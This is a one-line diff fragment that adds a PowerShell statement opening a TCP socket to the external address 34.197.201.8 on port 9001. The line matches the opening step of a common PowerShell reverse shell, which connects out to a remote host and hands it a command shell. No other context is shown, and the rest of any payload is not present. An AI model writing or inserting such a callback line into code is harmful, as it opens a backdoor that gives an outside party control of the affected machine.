@@ -1,0 +1,1 @@
+$socket = New-Object System.Net.Sockets.TcpClient('34.197.201.8', 9001);
